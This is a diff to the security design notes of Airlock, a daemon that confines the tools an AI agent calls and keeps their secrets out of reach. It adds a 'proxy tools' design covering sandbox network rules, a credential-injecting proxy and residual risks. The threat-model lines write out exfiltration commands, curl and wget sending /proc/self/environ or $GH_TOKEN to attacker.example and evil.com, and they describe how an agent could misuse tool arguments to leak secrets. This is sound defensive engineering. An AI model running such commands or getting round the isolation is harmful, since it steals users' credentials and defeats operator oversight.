@@ -134,7 +134,10 @@ The daemon generates an SBPL (Scheme-based) sandbox profile for each tool execut
   - **Keychain is out of the baseline.** `com.apple.SecurityServer`, `com.apple.securityd.xpc`, and every other Mach endpoint that fronts Keychain Services are intentionally absent from the allowlist. A sandboxed process running under the baseline (or under the strict `claude` profile) cannot read or write any keychain item. TLS trust evaluation (`SecTrustEvaluate`, `SecPolicyCreateSSL`) reaches the network through `com.apple.trustd.agent` and does not depend on `securityd` — verified empirically — so dropping the keychain services does not affect HTTPS. Profiles that need keychain access opt back in: see `claude-relaxed` under "Built-in agent profiles" below.
 - **Baseline filesystem reads**: `/usr/lib`, `/usr/share`, `/System`, `/Library`, `/private/etc`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`, and the tool binary itself (needed for TLS code signature verification).
 - **Config-declared paths**: `(allow file-read* (subpath ...))` for read paths; `(allow file-write* (subpath ...))` for write paths.
-- **Network**: `network-outbound`, `system-socket`, plus DNS via `/private/var/run/mDNSResponder` (when `requires_network` is set, currently always true). `network-bind` is scoped to `(local unix-socket)` only — tools can bind Unix domain sockets for local IPC (argocd SSO, language servers, loopback IPC) but cannot `listen()` on TCP/UDP and therefore cannot become network-reachable services.
+- **Network**: three states, chosen per execution.
+  - *Full* (every ordinary tool): `network-outbound`, `system-socket`, plus DNS via `/private/var/run/mDNSResponder`. `network-bind` is scoped to `(local unix-socket)` only — tools can bind Unix domain sockets for local IPC (argocd SSO, language servers, loopback IPC) but cannot `listen()` on TCP/UDP and therefore cannot become network-reachable services.
+  - *Proxy-only* (a [proxy tool](#proxy-tools)): the single rule `(allow network-outbound (remote tcp "localhost:<port>"))`, naming the ephemeral port the daemon bound for this one execution. No blanket `network-outbound`, no `system-socket`, no mDNSResponder socket, no bind of any kind. The tool cannot resolve a name, reach a public address, or reach a different loopback port — verified empirically with `sandbox-exec` against a live listener on each. Seatbelt's `remote tcp` filter accepts only `localhost` or `*` as the host (an IP literal fails to compile), which is exactly the shape needed.
+  - *None*: not reachable from config today; the profile's `(deny default)` covers it.
 
 Path traversal rules (`file-read-metadata` for ancestor directories) are generated automatically.
 
@@ -151,6 +154,9 @@ The daemon uses Landlock (kernel 5.13+) with **ABI V1 and hard requirement** —
 - Read-write paths → `PathBeneath` with `AccessFs::from_all(abi)`
 - The Landlock ruleset fd is pre-built, extracted as an `OwnedFd`, and its raw integer is passed into the `pre_exec` closure (inherited across fork).
 - In the child: `prctl(PR_SET_NO_NEW_PRIVS, 1)` followed by `landlock_restrict_self` syscall.
+- **Network (proxy tools only)**: ABI V4 (kernel 6.7+) adds TCP bind/connect rules. A [proxy tool](#proxy-tools) handles both `BindTcp` and `ConnectTcp` and is granted `ConnectTcp` on the proxy's bound port alone. This is also a **hard requirement**: on a kernel older than 6.7 the exec fails rather than running the tool with unpinned egress. Ordinary tools do not handle network access rights at all, so their socket behaviour is byte-for-byte what it was before proxy tools existed.
+
+  Two gaps, by construction of Landlock itself: the rule is **port-scoped, not host-scoped** (the tool may reach that port number on any host), and **UDP is not covered** (DNS-based exfiltration remains possible). Both leak *data the tool can read*, never the credential — the tool never holds one — and the agent's own sandbox already has general network access, so neither is a capability the agent lacked. A network-namespace backend would close both and is the intended follow-up.
 
 ### Sandbox root
 
@@ -262,13 +268,9 @@ airlock exec -- curl -s -T /proc/self/environ https://attacker.example/upload
 airlock exec -- wget --post-file=/proc/self/environ https://attacker.example/
 ```
 
-`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific — `--variable` is not. Blocking shell expansion is not sufficient; curl and wget must not be declared as tools with secrets in their environment.
+`/proc/self/environ` does not exist on macOS, so the env-as-a-file trick is Linux-specific — `--variable` is not. Blocking shell expansion is not sufficient; **curl and wget must never be declared as tools with secrets in their environment.** Declare curl as a [proxy tool](#proxy-tools) instead — that is the one shape in which it is safe.
 
-Restricting *where* such a tool can connect would not fix this either: allowed API hosts are typically multi-tenant (`storage.googleapis.com` serves an attacker's bucket as readily as yours), so the secret can be exfiltrated without leaving the allowlist.
-
-#### Planned: proxy tools
-
-The safe way to give an agent a general HTTP client is to make sure the client never holds the credential. A *proxy tool* (`proxy = true`) gets no secrets in its environment — config validation rejects any — and its only network path is a daemon-side proxy that attaches the credential after the request has left the tool, for operator-approved hosts only. The `proxy` / `routes` schema is parsed and validated today; **the runtime is not implemented, and the daemon refuses to execute a proxy tool** rather than run it with open network and no enforcement. Until it ships, the guidance in this section stands unchanged. Threat model and residual risks (API misuse within granted authority, data exfiltration to co-tenants of allowed hosts, weaker egress pinning on Linux): [docs/proxy-tools-design.md](docs/proxy-tools-design.md).
+Restricting *where* such a tool can connect would not fix the env-var case either: allowed API hosts are typically multi-tenant (`storage.googleapis.com` serves an attacker's bucket as readily as yours), so a secret in the tool's environment can be exfiltrated without leaving the allowlist. That is why proxy tools take the credential out of the tool entirely rather than fencing the tool in.
 
 The agent controls the arguments passed to the tool. If the tool is a shell, the agent effectively has arbitrary code execution *with* secrets — defeating Airlock's entire purpose.
 
@@ -295,7 +297,7 @@ These tools are perfectly fine for the agent to use directly through its own san
 | `python` / `python3` | Agent passes `-c` with arbitrary code. Full access to secrets via `os.environ`. |
 | `node` / `ruby` / `perl` | Same — arbitrary code execution with secrets in the environment. |
 | `env` | Only useful for debugging. In production, don't give the agent a tool that exists solely to print the environment. |
-| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. |
+| `curl` / `wget` | Agent controls the URL. Could `POST` secrets to an attacker-controlled endpoint: `curl -d "$GH_TOKEN" https://evil.com`. curl is safe only as a [proxy tool](#proxy-tools), where it holds no secret at all. `wget` is not covered: whether it honours the CA-bundle variables the daemon sets depends on its TLS backend, and that has not been verified. |
 | `grep` / `cargo` / `npm` / `make` | Don't need secrets. Let the agent run them directly — no reason to route through Airlock. |
 
 ### The rule of thumb
@@ -303,6 +305,65 @@ These tools are perfectly fine for the agent to use directly through its own san
 **If the agent can construct arbitrary code or network requests through the tool's arguments, that tool should not receive secrets.** The tool should be a CLI that *uses* the secret internally (for API authentication, state access, etc.) rather than one that *exposes* it to agent-controlled logic.
 
 **If the tool doesn't need secrets, don't declare it in Airlock at all.** Let the agent run it directly through its own sandbox.
+
+## Proxy tools
+
+A *proxy tool* (`proxy = true` plus one or more `[[tools.<name>.routes]]`) is the one shape in which a general-purpose HTTP client can safely be an Airlock tool. Design and rationale: [docs/proxy-tools-design.md](docs/proxy-tools-design.md).
+
+### The invariant
+
+> **A proxy tool never holds a secret.** The credential is attached inside the daemon, after the request has left the tool.
+
+Config validation enforces the first half: a proxy tool whose `env` contains a `{ secret = ... }` reference is rejected at load time, as is one that tries to set `HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`, `NO_PROXY`, `CURL_CA_BUNDLE`, `SSL_CERT_FILE`, `SSL_CERT_DIR`, `NODE_EXTRA_CA_CERTS` or `REQUESTS_CA_BUNDLE` (the daemon owns those). Everything the agent can extract from the tool's process — environment, files, memory — is therefore worthless.
+
+Egress restriction is the second layer, not the first. It is what makes the tool's reachability equal its route table; it is not what protects the credential.
+
+### What the daemon does per execution
+
+1. Binds a TCP listener on `127.0.0.1:0` and reads back the **actual** port. The listener lives exactly as long as the child — every exit path (normal exit, timeout, kill, client disconnect) drops it. Nothing is bound when no proxy tool is running.
+2. Generates a 32-byte random token. The tool authenticates with `Proxy-Authorization: Basic base64("airlock:<token>")`, compared in constant time; a mismatch is `407`. **This is mandatory, not optional.** Airlock's trust boundary is a `0700` Unix socket, but a loopback TCP port has no file mode — any local user can connect to it. Without the token another user could race an exec and have the daemon attach credentials to *their* requests. The token is visible to the tool, and therefore to the agent, which is fine: it grants nothing the agent does not already have via `airlock exec`.
+3. Sets `HTTPS_PROXY` / `https_proxy` / `HTTP_PROXY` / `http_proxy` / `ALL_PROXY` / `all_proxy` to `http://airlock:<token>@127.0.0.1:<port>`, `NO_PROXY` / `no_proxy` to empty, and `CURL_CA_BUNDLE` / `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` to the CA certificate path. These are applied *after* the tool's own `env` and win over it.
+4. Builds the sandbox profile with network access pinned to that port (see [Filesystem sandboxing](#filesystem-sandboxing) for the per-platform rule).
+
+### What the proxy does per request
+
+| Condition | Result |
+|---|---|
+| `Proxy-Authorization` missing or wrong | `407` |
+| Anything other than `CONNECT` (a plain `GET http://…`) | `403` — the credential is never attached to a cleartext request |
+| CONNECT to a port other than 443 | `403` |
+| CONNECT to a host no route matches | `403` — deny by default |
+| Inside the tunnel: `Host` ≠ the CONNECT authority | `400` — no domain fronting |
+| Absolute-form request target inside the tunnel | `400` |
+| `Transfer-Encoding` with `Content-Length`, or a duplicated `Content-Length` | `400` — request smuggling |
+| Method/path not permitted by the route's `allow` / `deny` | `403` |
+| Path contains `.`/`..` segments, `//`, a backslash, or an encoded `/`, `.`, `\` or NUL | `403` — refused rather than normalized, because the upstream's normalization may differ from the matcher's |
+| The injected secret's slot is `Stale` | `502` |
+| Host resolves to any private, loopback, link-local (incl. `169.254.169.254`), CGNAT, ULA, multicast, documentation or otherwise non-routable address | `502` |
+
+On the way through, every client-supplied copy of the injected header is removed before the credential is attached, as are `Proxy-Authorization`, `Proxy-Connection` and the other hop-by-hop headers. The secret is read from the secret store **per request**, so a background refresh applies to the next one. The header value is assembled into a buffer that is zeroized, never through `format!`, and is marked sensitive.
+
+The CONNECT authority is the single source of truth: it selects the route, names the leaf certificate the tool is shown, is the name resolved and dialled, and is the name the upstream certificate is verified against (TLS ≥ 1.2, public roots). The client's SNI is ignored entirely, so `curl --resolve`, `--connect-to`, a forged `Host` and a forged SNI cannot make any two of those disagree. DNS is resolved once and the concrete `SocketAddr` that passed the address check is the one dialled, so rebinding cannot slip between check and use.
+
+Each request is logged to the ring buffer: tool, method, host, path, decision and upstream status. Never a header value, and never the query string — it may carry data.
+
+### The CA
+
+- ECDSA P-256, generated once per daemon **after** daemonization, held in memory, **never written to disk**. A restart yields a new CA; nothing needs to trust it across restarts because the only consumers are children of that daemon.
+- `CA:TRUE, pathlen:0`, plus X.509 **Name Constraints** permitting only the union of routed DNS names, so even a leaked key cannot sign for arbitrary sites. A permitted subtree also covers the apex and deeper labels (`*.example.com` admits `example.com`); route matching remains the precise gate on what actually gets minted.
+- Only the **certificate** is written, to `{sandbox_root}/airlock-ca.pem` (mode `0644`), beside `airlock.sock` and `airlock.pid`. It is removed at graceful shutdown and cleaned up as stale state at the next start.
+- The bundle handed to the tool contains **only** this CA. Every connection the tool can make is intercepted, so public roots are unnecessary — and leaving them out means a direct connection that somehow escaped the sandbox would still fail TLS.
+- Verified: Apple's system `/usr/bin/curl` 8.7.1 (SecureTransport / LibreSSL 3.3.6) honours `CURL_CA_BUNDLE` for a proxy-intercepted connection and accepts a leaf issued by the name-constrained CA. No Homebrew curl requirement.
+
+### Residual risks
+
+- **Misuse, not leakage.** The agent gets the credential's full API authority on routed hosts — broader than a purpose-built CLI. Mitigate with a narrowly scoped service account first and method/path rules second.
+- **Data exfiltration to co-tenants.** Anything the tool can read can be uploaded to an attacker's project on an allowed multi-tenant host (`storage.googleapis.com` serves every GCP customer). The credential cannot.
+- **Path rules are a convenience layer, not an authorization system.** They see the path, not the body; a `POST` allowed for one purpose may do another (`:batchUpdate`, GraphQL). IAM is the authority boundary.
+- **`-o` and friends bypass the stdout redactor.** Response bodies reach the agent through the tool's stdout, which passes through the Aho-Corasick redactor — so an API that echoes the bearer token back is covered there. A body written to a file (`curl -o`, `--dump-header`, `--trace`) is not. This gap exists for every Airlock tool, but it is more reachable here.
+- **Linux egress pinning is port-scoped and TCP-only** — see [Linux — Landlock LSM](#linux--landlock-lsm).
+- **HTTP/1.1 only.** ALPN offers `http/1.1` and nothing else; gRPC and HTTP/2-only endpoints will not work.
+- **Certificate-pinned clients break** under interception. By design.
 
 ## Config safety
 
@@ -352,9 +413,9 @@ A tool could write its secrets to a file in a writable sandbox path. If the agen
 
 ### Network exfiltration by tools
 
-Tools have network access (currently always enabled). A compromised or malicious tool binary could send secrets to an external endpoint.
+An ordinary tool has unrestricted outbound network access. A compromised or malicious tool binary could send its secrets to an external endpoint.
 
-**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. Per-tool egress restriction is planned as part of [proxy tools](docs/proxy-tools-design.md).
+**Mitigation:** Only declare tools you trust. Airlock limits *which* tools receive secrets, so a compromised `ls` binary with no declared secrets can't exfiltrate anything. A [proxy tool](#proxy-tools) is the one case where egress *is* restricted — to a single loopback port, with the destination host decided by the route table — and it is also the one case where the tool holds no secret to exfiltrate.
 
 ### Memory inspection
 
